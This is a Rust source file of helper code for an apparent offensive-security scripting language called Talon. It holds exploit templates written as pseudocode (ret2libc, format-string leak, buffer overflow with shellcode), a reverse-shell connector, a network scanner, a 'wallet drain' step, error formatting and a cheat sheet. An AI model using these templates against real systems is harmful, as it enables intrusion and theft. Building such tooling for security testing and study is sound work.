use std::collections::HashMap;

pub struct ScriptHelper;

impl ScriptHelper {
    pub fn new() -> Self {
        ScriptHelper
    }
    
    pub fn common_exploits() -> HashMap<&'static str, &'static str> {
        let mut exploits = HashMap::new();
        
        exploits.insert("ret2libc", r#"
# Quick ret2libc exploit template
define function ret2libc(libc_base, cmd_string_addr)
    let pop_rdi = libc_base + 0x0002155f
    let system_addr = libc_base + 0x050d60
    
    let payload = [pop_rdi, cmd_string_addr, system_addr]
    return payload
end
"#);
        
        exploits.insert("format_string", r#"
# Format string info leak template
define function leak_with_format(offset)
    let leak_payload = "%{offset}$p"
    return leak_payload
end
"#);
        
        exploits.insert("buffer_overflow", r#"
# Basic buffer overflow template
define function bof_exploit(padding, ret_addr, shellcode)
    let nops = nop_sled of length 100
    let payload = padding + nops + shellcode + ret_addr
    return payload
end
"#);
        
        exploits.insert("afl_fuzz", r#"
# AFL-style fuzzing campaign
define function quick_fuzz(binary_path, corpus_dir, output_dir)
    for i in 0..1000
        fuzz binary binary_path with seed corpus_dir for 100 cycles
    end
end
"#);
        
        exploits
    }
    
    pub fn common_tasks() -> HashMap<&'static str, &'static str> {
        let mut tasks = HashMap::new();
        
        tasks.insert("port_scan", r#"
# Quick port scanner
define function scan_ports(target, start, end)
    for port in start..end
        connect to target on port port
    end
end
"#);
        
        tasks.insert("reverse_shell", r#"
# Reverse shell connector
define function rev_shell(lhost, lport)
    connect to lhost on port lport
    execute shellcode in memory
end
"#);
        
        tasks.insert("decrypt_xor", r#"
# XOR decryption helper
define function xor_decrypt(data, key)
    let result = []
    for i in 0..len(data)
        result.push(data[i] ^ key)
    end
    return result
end
"#);
        
        tasks
    }
    
    pub fn generate_quick_start(exploit_type: &str) -> String {
        match exploit_type {
            "pwn" => format!(r#"
# Talon Quick Start: Binary Exploitation

# 1. Information gathering
analyze pe file "target.exe"
disassemble "target.exe"

# 2. Find vulnerabilities
scan strings in "target.exe"
detect vm in "target.exe"

# 3. Build exploit
let overflow_size = 264
let ret_addr = 0xdeadbeef

# 4. Craft payload
stack overflow with padding overflow_size and return to ret_addr

# 5. Execute
execute shellcode in memory
"#),
            
            "web3" => format!(r#"
# Talon Quick Start: Web3 Exploitation

# 1. Contract analysis
fetch contract "0xContractAddress" using api key "YOUR_KEY"
parse abi json "contract.json"

# 2. Vulnerability scanning
scan for reentrancy in "contract.sol"
detect delegatecall in "contract.sol"

# 3. Transaction analysis
trace transaction "0xTxHash"
simulate wallet drain from "0xVictim" token "0xToken" amount "1000"

# 4. Execute
call ethereum node "https://mainnet.infura.io/v3/KEY" with data "0x..."
"#),
            
            "fuzzing" => format!(r#"
# Talon Quick Start: Fuzzing

# 1. Basic file fuzzing
fuzz file "input.dat"

# 2. Network fuzzing
fuzz remote "192.168.1.100" on port 8080

# 3. Coverage-guided fuzzing (advanced)
let fuzzer = AFL()
fuzzer.add_seed("seed1.dat")
fuzzer.run("./target", 10000)

# 4. Format-specific fuzzing
fuzz png "image.png"
fuzz elf "binary"
"#),
            
            "recon" => r##"
# Talon Quick Start: Reconnaissance

# 1. Network scanning
define function scan_network(subnet)
    for i in 1..254
        let ip = "{subnet}.{i}"
        connect to ip on port 22
        connect to ip on port 80
        connect to ip on port 443
    end
end

# 2. Service enumeration
scan_network("192.168.1")

# 3. Banner grabbing
connect to "192.168.1.100" on port 80

# 4. Vulnerability detection
detect vm in "target.exe"
"##.to_string(),
            
            _ => format!("# Unknown exploit type: {}\n# Available: pwn, web3, fuzzing, recon\n", exploit_type),
        }
    }
}

use colored::*;

pub struct ErrorHelper;

impl ErrorHelper {
    pub fn suggest_fix(error_msg: &str) -> String {
        let tip = if error_msg.contains("missing") {
            "Check your syntax. Missing semicolons or 'end' keywords are common issues."
        } else if error_msg.contains("undefined") || error_msg.contains("not found") {
            "Make sure to define functions before calling them. Use 'define function name() ... end'"
        } else if error_msg.contains("type") {
            "Use type hints to avoid type errors. Example: 'let x: int = 42'"
        } else if error_msg.contains("parse") {
            "Common syntax errors:\n     • Missing 'end' keyword\n     • Unclosed quotes\n     • Invalid characters\n     • Check the examples in scripts/ folder"
        } else if error_msg.contains("argument") || error_msg.contains("requires") {
            "Check function signature. Use help(\"function_name\") to see required parameters."
        } else if error_msg.contains("file") || error_msg.contains("path") {
            "Verify the file path exists and you have read permissions."
        } else {
            return error_msg.to_string();
        };
        
        format!("{}\n\n{} {}", 
            error_msg.red().bold(),
            "TIP:".yellow(),
            tip.cyan()
        )
    }
    
    pub fn format_error_with_context(error_msg: &str, source: Option<&str>, line: Option<usize>) -> String {
        let mut output = String::new();
        
        output.push_str(&format!("{}\n", "╔═══════════════════════════════════════════════════════════╗".red()));
        output.push_str(&format!("{}\n", "║                      [ERROR] ERROR                             ║".red().bold()));
        output.push_str(&format!("{}\n\n", "╚═══════════════════════════════════════════════════════════╝".red()));
        
        if let Some(line_num) = line {
            output.push_str(&format!("{} {}\n\n", "Location:".yellow(), format!("Line {}", line_num).white().bold()));
            
            if let Some(src) = source {
                let lines: Vec<&str> = src.lines().collect();
                let start = line_num.saturating_sub(2).max(1);
                let end = (line_num + 2).min(lines.len());
                
                output.push_str(&format!("{}\n", "Source Context:".cyan().bold()));
                output.push_str(&format!("{}\n", "─────────────────────────────────────────────────────────".bright_black()));
                
                for i in start..=end {
                    if i == 0 || i > lines.len() {
                        continue;
                    }
                    if i == line_num {
                        let prefix = format!(" → {:3} │ ", i).red().bold();
                        output.push_str(&format!("{}{}\n", prefix, lines[i - 1].white().bold()));
                    } else {
                        let prefix = format!("   {:3} │ ", i).bright_black();
                        output.push_str(&format!("{}{}\n", prefix, lines[i - 1].bright_black()));
                    }
                }
                output.push_str(&format!("{}\n\n", "─────────────────────────────────────────────────────────".bright_black()));
            }
        }
        
        output.push_str(&format!("{} {}\n\n", "Error:".red().bold(), error_msg.white()));
        
        output.push_str(&Self::suggest_fix(error_msg));
        
        output
    }
    
    pub fn common_mistakes() -> Vec<(&'static str, &'static str)> {
        vec![
            ("Forgot 'end' keyword", "Every block (function, if, for) needs 'end'"),
            ("Missing quotes", "Strings must be in quotes: \"like this\""),
            ("Wrong function syntax", "Use: define function name() ... end"),
            ("Undefined variable", "Declare with 'let' before using: let x = 10"),
            ("Type mismatch", "Add type hints: let port: int = 8080"),
            ("Function not found", "Check function name spelling and make sure it's defined"),
            ("Invalid argument", "Verify function expects the arguments you're passing"),
        ]
    }
}

pub struct DocGenerator;

impl DocGenerator {
    pub fn generate_cheatsheet() -> String {
        format!(r#"
═══════════════════════════════════════════════════════════════
                    TALON DSL CHEAT SHEET
═══════════════════════════════════════════════════════════════

VARIABLES & TYPES
  let x = 42                    # Auto type
  let name: string = "talon"    # With type hint
  const PI = 3.14               # Constant

FUNCTIONS
  define function add(a, b)
      return a + b
  end
  
  add(5, 10)                    # Call function

CONTROL FLOW
  if x > 10
      # do something
  else
      # do something else
  end
  
  for i in 0..10
      # loop body
  end

EXPLOITATION BASICS
  # Buffer overflow
  stack overflow with padding 264 and return to 0xdeadbeef
  
  # Format string
  format string exploit on "vuln" using offset 6
  
  # Shellcode
  load shellcode from "payload.bin"
  execute shellcode in memory

NETWORK OPERATIONS
  connect to "192.168.1.100" on port 4444
  fuzz remote "target.com" on port 80

BINARY ANALYSIS
  analyze pe file "malware.exe"
  disassemble "binary"
  scan strings in "file.exe"
  
WEB3 / BLOCKCHAIN
  parse abi json "contract.json"
  scan for reentrancy in "contract.sol"
  trace transaction "0xTxHash"

FUZZING
  fuzz file "input.dat"
  fuzz binary "target" with seed "seed.bin" for 1000 cycles

ADVANCED FEATURES
  # Pattern matching
  match value
      case 1: # handle 1
      case 2: # handle 2
  end
  
  # Try-catch
  try
      # risky operation
  catch err
      # handle error
  end
  
  # Async operations
  define async function fetch_data()
      await download_file()
  end

═══════════════════════════════════════════════════════════════
TIP: Run 'talon list-templates' to see exploit templates!
TIP: Use 'talon repl' for interactive testing!
═══════════════════════════════════════════════════════════════
"#)
    }
    
    pub fn generate_example(category: &str) -> String {
        match category {
            "basic" => r#"
# Hello World in Talon
define function greet(name)
    let message = "Hello, {name}!"
    return message
end

greet("Hacker")
"#.to_string(),
            
            "exploit" => r#"
# Complete exploit example
define function pwn_target()
    # 1. Recon
    analyze pe file "vulnerable.exe"
    scan strings in "vulnerable.exe"
    
    # 2. Find offset
    find format offset for "vulnerable.exe"
    
    # 3. Build payload
    let padding = 264
    let ret_addr = 0x080484ab
    stack overflow with padding padding and return to ret_addr
    
    # 4. Execute
    execute shellcode in memory
end

pwn_target()
"#.to_string(),
            
            _ => "# No example for this category\n".to_string(),
        }
    }
}

pub fn init_helpers() {
    println!("Talon Helper Library initialized");
    println!("TIP: Type 'help()' for assistance");
    println!("Type 'examples()' for code examples");
    println!("Type 'templates()' for exploit templates");
}
